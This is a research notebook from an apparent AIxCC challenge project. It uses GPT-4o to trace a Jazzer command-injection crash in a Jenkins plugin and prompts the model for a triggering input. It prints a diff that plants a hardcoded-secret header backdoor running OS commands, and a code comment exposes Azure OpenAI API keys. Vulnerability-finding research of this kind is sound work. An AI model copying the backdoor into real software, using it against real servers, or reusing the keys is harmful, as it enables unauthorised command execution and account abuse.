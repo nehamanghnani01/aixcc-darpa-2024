{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import sys\n",
    "import subprocess\n",
    "import time\n",
    "import re\n",
    "from langchain_openai import ChatOpenAI\n",
    "from openai import AzureOpenAI"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: gitpython in c:\\python312\\lib\\site-packages (3.1.43)\n",
      "Requirement already satisfied: gitdb<5,>=4.0.1 in c:\\python312\\lib\\site-packages (from gitpython) (4.0.11)\n",
      "Requirement already satisfied: smmap<6,>=3.0.1 in c:\\python312\\lib\\site-packages (from gitdb<5,>=4.0.1->gitpython) (5.0.1)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "[notice] A new release of pip is available: 24.0 -> 24.1.1\n",
      "[notice] To update, run: python.exe -m pip install --upgrade pip\n"
     ]
    }
   ],
   "source": [
    "%pip install gitpython\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Note: The openai-python library support for Azure OpenAI is in preview.\n",
    "#Note: This code sample requires OpenAI Python library version 1.0.0 or higher.\n",
    "\n",
    "\n",
    "#key1: 7549f11ab7f9442685838d936d8f7787\n",
    "#key2: c3112b58dbb840c693ea08c9a9362fb3\n",
    "#endpoint: https://aixcc-openai-westus.openai.azure.com/\n",
    "\n",
    "gpt4o_key = '<gpt4o key here>'  #gpt-4-1106\n",
    "gpt4_key = '<gpt4 key here>'   #gpt-4-vision, gpt-4o\n",
    "\n",
    "model_name = 'gpt-4o'  #gpt-4-vision, gpt-4o\n",
    "\n",
    "os.environ['AZURE_OPENAI_KEY'] = gpt4o_key\n",
    "\n",
    "client = AzureOpenAI(\n",
    "  azure_endpoint = \"<endpoint here>\", \n",
    "  api_key=os.getenv(\"AZURE_OPENAI_KEY\"),  \n",
    "  api_version=\"2024-02-15-preview\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_inference(user_input):\n",
    "    # user_input = \"what is the capital of France?\"\n",
    "\n",
    "    tic = time.time()\n",
    "    message_text = [{\"role\":\"system\",\"content\":\"You are an AI assistant that helps people find information.\"},{\"role\":\"user\",\"content\":user_input}]\n",
    "\n",
    "    response = client.chat.completions.create(\n",
    "        model=model_name,\n",
    "        messages = message_text,\n",
    "        temperature=0.7,\n",
    "        max_tokens=4096,\n",
    "        top_p=0.95,\n",
    "        frequency_penalty=0,\n",
    "        presence_penalty=0,\n",
    "        stop=None\n",
    "    )\n",
    "\n",
    "    print(response.choices[0].message.content)\n",
    "    latency = time.time() - tic\n",
    "    print(f\"\\nLatency: {latency:.3f}s\")\n",
    "    return response.choices[0].message.content"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Source code is the Challenge Project 2 (CP2) of the AIXCC DARPA Challenge"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src\n"
     ]
    }
   ],
   "source": [
    "src_dir = \"C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src\"\n",
    "print(src_dir)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Folders in the source directory:\n",
      "jenkins\n",
      "jenkins-harnesses\n",
      "plugins\n"
     ]
    }
   ],
   "source": [
    "folders = [f for f in os.listdir(src_dir) if os.path.isdir(os.path.join(src_dir, f))]\n",
    "\n",
    "print(\"Folders in the source directory:\")\n",
    "for folder in folders:\n",
    "    print(folder)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2 source files - jenkins & plugins "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Finding all dirs which have the src directory"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# def find_and_log_src_dirs(current_path):\n",
    "#     for root, dirs, files in os.walk(current_path):\n",
    "#         if 'src' in dirs:\n",
    "#             src_path = os.path.join(root, 'src')\n",
    "#             print(f\"Found 'src' directory at: {src_path}\")\n",
    "#             try:\n",
    "                \n",
    "#                 os.chdir(src_path)\n",
    "                \n",
    "#                 result = subprocess.run(['wsl', 'git', 'log', '--oneline'], capture_output=True, text=True)\n",
    "                \n",
    "#                 print(f\"Git log for {src_path}:\\n{result.stdout}\")\n",
    "#             except Exception as e:\n",
    "#                 print(f\"An error occurred while running git log in {src_path}: {e}\")\n",
    "#             dirs.remove('src')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_paths = []\n",
    "def finding_src_dirs(current_path):\n",
    "    for root, dirs, files in os.walk(current_path):\n",
    "        if 'src' in dirs:\n",
    "            src_path = os.path.join(root, 'src')\n",
    "            try:\n",
    "                os.chdir(src_path)\n",
    "                normalized_src_path = os.path.normpath(src_path)\n",
    "                normalized_src_path = normalized_src_path.replace('\\\\', '/')\n",
    "                all_paths.append(normalized_src_path)\n",
    "            except Exception as e:\n",
    "                print(f\"Error : {e}\")\n",
    "            dirs.remove('src')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "finding_src_dirs(src_dir)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/jenkins/src',\n",
       " 'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/jenkins/cli/src',\n",
       " 'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/jenkins/core/src',\n",
       " 'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/jenkins/test/src',\n",
       " 'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/jenkins/war/src',\n",
       " 'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/jenkins/websocket/jetty10/src',\n",
       " 'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/jenkins/websocket/spi/src',\n",
       " 'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/jenkins-harnesses/jenkins-harness-two/src',\n",
       " 'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/plugins/pipeline-util-plugin/src']"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_paths"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### Below defined are the sanitizer logs which describes the vulnerability in the code, and the sanitizer which is triggered"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "logs = '''\n",
    "== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: OS Command Injection\n",
    "Executing OS commands with attacker-controlled data can lead to remote code execution.\n",
    "Found in argument 0\n",
    "        at com.code_intelligence.jazzer.sanitizers.OsCommandInjection.ProcessImplStartHook(OsCommandInjection.java:35)\n",
    "        at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1110)\n",
    "        at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1073)\n",
    "        at io.jenkins.plugins.UtilPlug.UtilMain.createUtils(UtilMain.java:194)\n",
    "        at io.jenkins.plugins.UtilPlug.UtilMain.doexecCommandUtils(UtilMain.java:157)\n",
    "        at com.aixcc.jenkins.harnesses.two.JenkinsTwo.fuzz(JenkinsTwo.java:80)\n",
    "        at com.aixcc.jenkins.harnesses.two.JenkinsTwo.fuzzerTestOneInput(JenkinsTwo.java:39)\n",
    "DEDUP_TOKEN: 2ab70579dcd49e31\n",
    "== libFuzzer crashing input ==\n",
    "reproducer_path='.'; Java reproducer written to ./Crash_70a0fbdbde2ac5ea0f8e038449f4ad2492028a7b.java\n",
    "\n",
    "jazzer exit=77\n",
    "'''"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### Getting the exact path of the src/ dir where the error occured (since there were multiple source files)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "user_input = f'''Given the = {logs} which mention the class where the error occurs, and the source files {all_paths}, \n",
    "can you identify which path in the source code is causing the vulnerability mentioned in the logs? \n",
    "Just mention the source path from the {all_paths} in your response and nothing else'''\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/plugins/pipeline-util-plugin/src\n",
      "\n",
      "Latency: 1.281s\n"
     ]
    }
   ],
   "source": [
    "\n",
    "get_path = get_inference(user_input)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Correctly indentifies the source path from the logs (from run_pov command) and the source directories paths "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Now, lets move to this source path mentioned in the response and run 'git log command' to get the commits "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "!cd {get_path} "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'C:\\\\Users\\\\neham\\\\TAMU\\\\research_project_llm\\\\challenge-002-jenkins-cp\\\\src\\\\plugins\\\\pipeline-util-plugin\\\\src'"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "341da485d908f5501f04beb49564c7c7cc0b34eb\n",
      "d4860a8ac8b8c1d4642357840adb4347f7ade43a\n",
      "a868688561d1d768dd4c3c68a3b3522b396a37b6\n"
     ]
    }
   ],
   "source": [
    "# Get list of commit hashes\n",
    "!wsl git log --pretty=format:\"%H\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "parent_folder = os.path.dirname(src_dir)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "parent_folder"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Saved diff for commit a868688561d1d768dd4c3c68a3b3522b396a37b6 to C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp\\a868688561d1d768dd4c3c68a3b3522b396a37b6.diff\n",
      "Saved diff for commit d4860a8ac8b8c1d4642357840adb4347f7ade43a to C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp\\d4860a8ac8b8c1d4642357840adb4347f7ade43a.diff\n",
      "Saved diff for commit 341da485d908f5501f04beb49564c7c7cc0b34eb to C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp\\341da485d908f5501f04beb49564c7c7cc0b34eb.diff\n"
     ]
    }
   ],
   "source": [
    "import subprocess\n",
    "import os\n",
    "\n",
    "\n",
    "def get_commit_hashes():\n",
    "    result = subprocess.run([\"wsl\", \"git\", \"log\", \"--pretty=format:%H\"], capture_output=True, text=True)\n",
    "    return result.stdout.splitlines()\n",
    "\n",
    "def get_diff(commit_hash):\n",
    "    result = subprocess.run([\"wsl\", \"git\", \"show\", commit_hash], capture_output=True, text=True)\n",
    "    if result.returncode == 0:  \n",
    "        return result.stdout\n",
    "    else:\n",
    "        print(f\"Error fetching diff for commit {commit_hash}\")\n",
    "        return None\n",
    "\n",
    "commits = get_commit_hashes()\n",
    "commits.reverse()\n",
    "\n",
    "for commit in commits:\n",
    "    diff_content = get_diff(commit)\n",
    "    if diff_content is not None:\n",
    "        lines = diff_content.split('\\n')\n",
    "        \n",
    "        diff_start_index = next((i for i, line in enumerate(lines) if line.startswith('diff --git')), None)\n",
    "\n",
    "        if diff_start_index is not None:\n",
    "            relevant_lines = lines[diff_start_index:]\n",
    "\n",
    "            relevant_diff_content = '\\n'.join(relevant_lines)\n",
    "\n",
    "            filename = f\"{commit}.diff\"\n",
    "            filepath = os.path.join(parent_folder, filename)\n",
    "            \n",
    "            with open(filepath, 'w') as f:\n",
    "                f.write(relevant_diff_content)\n",
    "                \n",
    "            print(f\"Saved diff for commit {commit} to {filepath}\")\n",
    "        else:\n",
    "            print(f\"No 'diff --git' line found for commit {commit}. Skipping.\")\n",
    "    else:\n",
    "        print(f\"Skipping commit {commit} due to error or no diff content\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a868688561d1d768dd4c3c68a3b3522b396a37b6',\n",
       " 'd4860a8ac8b8c1d4642357840adb4347f7ade43a',\n",
       " '341da485d908f5501f04beb49564c7c7cc0b34eb']"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "commits"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "index a854420..35135ea 100644\n",
      "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "@@ -148,7 +148,22 @@ public class UtilMain implements RootAction {\n",
      "         // use LOCAL method:\n",
      "         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
      " \n",
      "-       if (isAllowed) {\n",
      "+        // hardcoded hash value:\n",
      "+        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
      "+        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
      "+            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
      "+            byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
      "+            if (MessageDigest.isEqual(sha256, providedHash)) {\n",
      "+                String result = createUtils(cmdSeq2);\n",
      "+                if (result == null || result.length() == 0) {\n",
      "+                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "+                    events.add(event);\n",
      "+                }\n",
      "+            } else {\n",
      "+                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n",
      "+                events.add(event);\n",
      "+            }\n",
      "+        } else if (isAllowed) {\n",
      "             String result = createUtils(cmdSeq2);\n",
      "             if (result == null || result.isEmpty()) {\n",
      "                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "\n"
     ]
    }
   ],
   "source": [
    "commit = 'd4860a8ac8b8c1d4642357840adb4347f7ade43a'  #commit which introduced the vulnerability (mentioned in the challenge project) \n",
    "\n",
    "filename = f\"{commit}.diff\"\n",
    "filepath = os.path.join(parent_folder, filename)\n",
    "\n",
    "if os.path.exists(filepath):\n",
    "    # Read the file contents\n",
    "    with open(filepath, 'r') as f:\n",
    "        diff_content = f.read()\n",
    "        print(diff_content)  # Display diff content as a string\n",
    "else:\n",
    "    print(f\"Diff file for commit {commit} not found.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\\nindex a854420..35135ea 100644\\n--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\\n+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\\n@@ -148,7 +148,22 @@ public class UtilMain implements RootAction {\\n         // use LOCAL method:\\n         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\\n \\n-       if (isAllowed) {\\n+        // hardcoded hash value:\\n+        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\\n+        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\\n+            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\\n+            byte[] providedHash = DigestUtils.sha256(backdoorValue);\\n+            if (MessageDigest.isEqual(sha256, providedHash)) {\\n+                String result = createUtils(cmdSeq2);\\n+                if (result == null || result.length() == 0) {\\n+                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\\n+                    events.add(event);\\n+                }\\n+            } else {\\n+                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\\n+                events.add(event);\\n+            }\\n+        } else if (isAllowed) {\\n             String result = createUtils(cmdSeq2);\\n             if (result == null || result.isEmpty()) {\\n                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\\n'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "diff_content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Changed files:\n",
      "src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n"
     ]
    }
   ],
   "source": [
    "def get_changed_files(diff_content):\n",
    "    changed_files = set()  # Use a set to store unique file paths\n",
    "    lines = diff_content.split('\\n')\n",
    "    \n",
    "    for line in lines:\n",
    "        if line.startswith('diff --git'):\n",
    "            file_paths = line.split(' ')[2:4]  # Extract 'a/path/to/file' and 'b/path/to/file'\n",
    "            file_paths = [path[2:] if path.startswith('a/') or path.startswith('b/') else path for path in file_paths]  # Remove 'a/' or 'b/' prefix\n",
    "            changed_files.update(file_paths)\n",
    "    \n",
    "    return changed_files\n",
    "\n",
    "commit = 'd4860a8ac8b8c1d4642357840adb4347f7ade43a'  #commit which introduced the vulnerability \n",
    "\n",
    "filename = f\"{commit}.diff\"\n",
    "filepath = os.path.join(parent_folder, filename)\n",
    "changed_files_src = []\n",
    "\n",
    "if os.path.exists(filepath):\n",
    "        with open(filepath, 'r') as f:\n",
    "            diff_content = f.read()\n",
    "\n",
    "        changed_files = get_changed_files(diff_content)\n",
    "\n",
    "        print(\"Changed files:\")\n",
    "        for file_path in changed_files:\n",
    "            changed_files_src.append(file_path)\n",
    "            print(file_path)\n",
    "\n",
    "else:\n",
    "    print(f\"Diff file for commit {commit} not found.\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Test harness code - JenkinsTwo.java"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [],
   "source": [
    "test_file_path = src_dir + '/jenkins-harnesses/jenkins-harness-two/src/main/java/com/aixcc/jenkins/harnesses/two'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "package com.aixcc.jenkins.harnesses.two;\n",
      "\n",
      "import java.util.ArrayList;\n",
      "import java.util.Arrays;\n",
      "import java.util.Collections;\n",
      "import java.util.Enumeration;\n",
      "import java.util.List;\n",
      "\n",
      "import jenkins.model.Jenkins;\n",
      "import aixcc.util.StaplerReplacer;\n",
      "import java.nio.ByteBuffer;\n",
      "import java.util.*;\n",
      "\n",
      "import io.jenkins.plugins.UtilPlug.UtilMain;\n",
      "import org.kohsuke.stapler.WebApp;\n",
      "import org.kohsuke.stapler.RequestImpl;\n",
      "import org.kohsuke.stapler.ResponseImpl;\n",
      "import javax.servlet.ServletContext;\n",
      "import javax.servlet.http.HttpServletRequest;\n",
      "import javax.servlet.http.HttpServletResponse;\n",
      "import org.mockito.Mockito;\n",
      "import static org.mockito.Mockito.*;\n",
      "\n",
      "public class JenkinsTwo {\n",
      "\n",
      "    public static void main(String[] args) throws Throwable {\n",
      "    }\n",
      "\n",
      "\n",
      "    final int expected_data_length = Integer.BYTES + // picker\n",
      "            Integer.BYTES + // count\n",
      "            1 + // request header name minimum\n",
      "            1 + // separator\n",
      "            1 + // request header value minimum\n",
      "            1 + // separator\n",
      "            1; // command minimum\n",
      "\n",
      "    public static void fuzzerTestOneInput(byte[] data) throws Exception {\n",
      "        new JenkinsTwo().fuzz(data);\n",
      "    }\n",
      "\n",
      "    UtilMain nw;\n",
      "    Jenkins mockJ;\n",
      "    StaplerReplacer replacer;\n",
      "    RequestImpl req;\n",
      "    ResponseImpl resp;\n",
      "\n",
      "    private void fuzz(byte[] data) {\n",
      "        if (data.length < expected_data_length) {\n",
      "            return;\n",
      "        }\n",
      "\n",
      "        ByteBuffer buf = ByteBuffer.wrap(data);\n",
      "        int picker = buf.getInt();\n",
      "        int count = buf.getInt();\n",
      "\n",
      "        if (count > 255) return;\n",
      "\n",
      "        String whole = new String(Arrays.copyOfRange(data, 8, data.length));\n",
      "\n",
      "        String[] parts = whole.split(\"\\0\");\n",
      "\n",
      "        if (3 != parts.length) {\n",
      "            return;\n",
      "        }\n",
      "\n",
      "        setup_utilmain();\n",
      "        try {\n",
      "            setup_replacer();\n",
      "        } catch (Exception e) {\n",
      "            return; // eat it\n",
      "        }\n",
      "\n",
      "        set_header(parts[0], parts[1]);\n",
      "\n",
      "        for (int i = 0; i < count; i++) {\n",
      "            try {\n",
      "                switch (picker) {\n",
      "                    case 13:\n",
      "                        nw.doexecCommandUtils(parts[2], req, resp);\n",
      "                        break;\n",
      "                    default:\n",
      "                        throw new Exception(\"unsupported method picker\");\n",
      "                }\n",
      "            } catch (Exception e) {\n",
      "                continue; // eat it\n",
      "            }\n",
      "        }\n",
      "    }\n",
      "\n",
      "    private void setup_utilmain() {\n",
      "        nw = new UtilMain();\n",
      "        mockJ = Mockito.mock(Jenkins.class);\n",
      "        when(mockJ.hasPermission(Jenkins.ADMINISTER)).thenReturn(false);\n",
      "\n",
      "        nw.jenkin = mockJ;\n",
      "    }\n",
      "\n",
      "    private void setup_replacer() throws Exception {\n",
      "        replacer = new StaplerReplacer();\n",
      "        replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n",
      "    }\n",
      "\n",
      "    private void set_header(String name, String value) {\n",
      "        List<String> header_names = new ArrayList<>();\n",
      "        header_names.add(name);\n",
      "        Enumeration<String> headerNamesEnumeration = Collections.enumeration(header_names);\n",
      "\n",
      "        HttpServletRequest mockRequest = Mockito.mock(HttpServletRequest.class);\n",
      "        when(mockRequest.getHeaderNames()).thenReturn(headerNamesEnumeration);\n",
      "        when(mockRequest.getHeader(name)).thenReturn(value);\n",
      "        when(mockRequest.getHeader(\"Referer\")).thenReturn(\"http://localhost:8080/UtilPlug/execCommandUtils\");\n",
      "\n",
      "        req = new RequestImpl(replacer.stapler, mockRequest, Collections.emptyList(), null);\n",
      "\n",
      "        HttpServletResponse mockResp = Mockito.mock(HttpServletResponse.class);\n",
      "        resp = new ResponseImpl(replacer.stapler, mockResp);\n",
      "\n",
      "        replacer.setCurrentRequest(req);\n",
      "        replacer.setCurrentResponse(resp);\n",
      "    }\n",
      "}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "def read_file(file_path):\n",
    "    try:\n",
    "        with open(file_path, 'r') as file:\n",
    "            file_content = file.read()\n",
    "        return file_content\n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: File '{file_path}' not found.\")\n",
    "        return None\n",
    "    except Exception as e:\n",
    "        print(f\"Error: {e}\")\n",
    "        return None\n",
    "    \n",
    "file_path = test_file_path + '/JenkinsTwo.java'\n",
    "file_content = read_file(file_path)\n",
    "print(file_content)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Prompts to get Input blob "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "user_input = f'''\n",
    "You are a security expert. In the Jenkins project, the following the commit introduces a vulnerability - \n",
    "\n",
    "{diff_content}\n",
    "\n",
    "The vulnerability details are mentioned as follows - \n",
    "{logs}\n",
    "\n",
    "Provide a input blob such that when it is passed through the test harness mentioned below, it will trigger the vulnerability.\n",
    "{file_content}\n",
    "\n",
    "Check the source code mentioned in the commit diff, logs and test file throughly to identify the input blob that triggers the vulnerability.\n",
    "Only provide the blob without any additional information.\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "You are a security expert. In the Jenkins project, the following the commit introduces a vulnerability - \n",
      "\n",
      "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "index a854420..35135ea 100644\n",
      "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "@@ -148,7 +148,22 @@ public class UtilMain implements RootAction {\n",
      "         // use LOCAL method:\n",
      "         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
      " \n",
      "-       if (isAllowed) {\n",
      "+        // hardcoded hash value:\n",
      "+        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
      "+        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
      "+            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
      "+            byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
      "+            if (MessageDigest.isEqual(sha256, providedHash)) {\n",
      "+                String result = createUtils(cmdSeq2);\n",
      "+                if (result == null || result.length() == 0) {\n",
      "+                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "+                    events.add(event);\n",
      "+                }\n",
      "+            } else {\n",
      "+                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n",
      "+                events.add(event);\n",
      "+            }\n",
      "+        } else if (isAllowed) {\n",
      "             String result = createUtils(cmdSeq2);\n",
      "             if (result == null || result.isEmpty()) {\n",
      "                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "\n",
      "\n",
      "The vulnerability details are mentioned as follows - \n",
      "\n",
      "== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: OS Command Injection\n",
      "Executing OS commands with attacker-controlled data can lead to remote code execution.\n",
      "Found in argument 0\n",
      "        at com.code_intelligence.jazzer.sanitizers.OsCommandInjection.ProcessImplStartHook(OsCommandInjection.java:35)\n",
      "        at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1110)\n",
      "        at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1073)\n",
      "        at io.jenkins.plugins.UtilPlug.UtilMain.createUtils(UtilMain.java:194)\n",
      "        at io.jenkins.plugins.UtilPlug.UtilMain.doexecCommandUtils(UtilMain.java:157)\n",
      "        at com.aixcc.jenkins.harnesses.two.JenkinsTwo.fuzz(JenkinsTwo.java:80)\n",
      "        at com.aixcc.jenkins.harnesses.two.JenkinsTwo.fuzzerTestOneInput(JenkinsTwo.java:39)\n",
      "DEDUP_TOKEN: 2ab70579dcd49e31\n",
      "== libFuzzer crashing input ==\n",
      "reproducer_path='.'; Java reproducer written to ./Crash_70a0fbdbde2ac5ea0f8e038449f4ad2492028a7b.java\n",
      "\n",
      "jazzer exit=77\n",
      "\n",
      "\n",
      "Provide a input blob such that when it is passed through the test harness mentioned below, it will trigger the vulnerability.\n",
      "package com.aixcc.jenkins.harnesses.two;\n",
      "\n",
      "import java.util.ArrayList;\n",
      "import java.util.Arrays;\n",
      "import java.util.Collections;\n",
      "import java.util.Enumeration;\n",
      "import java.util.List;\n",
      "\n",
      "import jenkins.model.Jenkins;\n",
      "import aixcc.util.StaplerReplacer;\n",
      "import java.nio.ByteBuffer;\n",
      "import java.util.*;\n",
      "\n",
      "import io.jenkins.plugins.UtilPlug.UtilMain;\n",
      "import org.kohsuke.stapler.WebApp;\n",
      "import org.kohsuke.stapler.RequestImpl;\n",
      "import org.kohsuke.stapler.ResponseImpl;\n",
      "import javax.servlet.ServletContext;\n",
      "import javax.servlet.http.HttpServletRequest;\n",
      "import javax.servlet.http.HttpServletResponse;\n",
      "import org.mockito.Mockito;\n",
      "import static org.mockito.Mockito.*;\n",
      "\n",
      "public class JenkinsTwo {\n",
      "\n",
      "    public static void main(String[] args) throws Throwable {\n",
      "    }\n",
      "\n",
      "\n",
      "    final int expected_data_length = Integer.BYTES + // picker\n",
      "            Integer.BYTES + // count\n",
      "            1 + // request header name minimum\n",
      "            1 + // separator\n",
      "            1 + // request header value minimum\n",
      "            1 + // separator\n",
      "            1; // command minimum\n",
      "\n",
